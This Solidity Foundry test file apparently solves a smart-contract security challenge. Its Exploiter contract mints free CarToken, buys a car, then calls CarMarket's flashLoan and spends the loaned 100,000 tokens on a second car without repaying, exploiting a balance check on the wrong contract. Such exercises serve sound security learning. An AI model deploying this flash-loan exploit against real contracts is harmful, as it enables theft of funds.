// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "./utils/BaseTest.sol";
import "src/CarFactory.sol";
import "src/CarMarket.sol";
import "src/CarToken.sol";

contract CarMarketTest is BaseTest {
    CarFactory private carFactory;
    CarMarket private carMarket;
    CarToken private carToken;

    constructor() {
        string[] memory userLabels = new string[](2);
        userLabels[0] = "Alice";
        userLabels[1] = "Bob";
        preSetUp(2, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Attach the contract to the addresses on the fork
        carFactory = CarFactory(payable(0x012f0c715725683A5405B596f4F55D4AD3046854));
        carMarket = CarMarket(payable(0x07AbFccEd19Aeb5148C284Cd39a9ff2Ac835960A));
        carToken = CarToken(payable(0x66408824A99FF61ae2e032E3c7a461DED1a6718E));

        vm.label(address(carFactory), "CarFactory");
        vm.label(address(carMarket), "CarMarket");
        vm.label(address(carToken), "CarToken");
    }

    function testTakeOwnership() public {
        address player = users[0];

        vm.prank(player);

        // Deploy the exploit contract
        Exploiter exploiter = new Exploiter(carFactory, carMarket, carToken);

        // Assert that our user has 0 car purchased
        assertEq(carMarket.getCarCount(address(exploiter)), 0);

        // Trigger the exploit!
        exploiter.startAttack();

        // Assert that our user has 2 car purchased (success)
        assertEq(carMarket.getCarCount(address(exploiter)), 2);
    }
}

contract Exploiter {
    CarFactory private carFactory;
    CarMarket private carMarket;
    CarToken private carToken;

    constructor(
        CarFactory _carFactory,
        CarMarket _carMarket,
        CarToken _carToken
    ) {
        carFactory = _carFactory;
        carMarket = _carMarket;
        carToken = _carToken;

        // Approve the carMarket to be able to use all the needed token
        // Usually it would be better to single approve only the amount needed for the purchase
        // So in total it would be 1 token for the first purchase + 100k tokens for the second one
        carToken.approve(address(carMarket), 100_001 ether);
    }

    function startAttack() public {
        // mint free cartoken
        carToken.mint();

        // puchase our first car with the "free" minted token
        carMarket.purchaseCar("blue", "ford mustang", "leet");

        // Trigger the flashloan of 100k tokens
        (bool success, ) = address(carMarket).call(abi.encodeWithSignature("flashLoan(uint256)", 100_000 ether));
        require(success, "flashloan failed");
    }

    function receivedCarToken(address) external {
        // Purchase a new car with the 100k token we received with the loan
        carMarket.purchaseCar("red", "ferrari", "aloah");

        // in a normal flashloan we would be forced to give back the loan (plus some fee on the loan itself)
        // but in this case because the deployer made the error to check the balance on the wrong contract (not the one that was sending the loan)
        // we do not need to give it back
    }
}
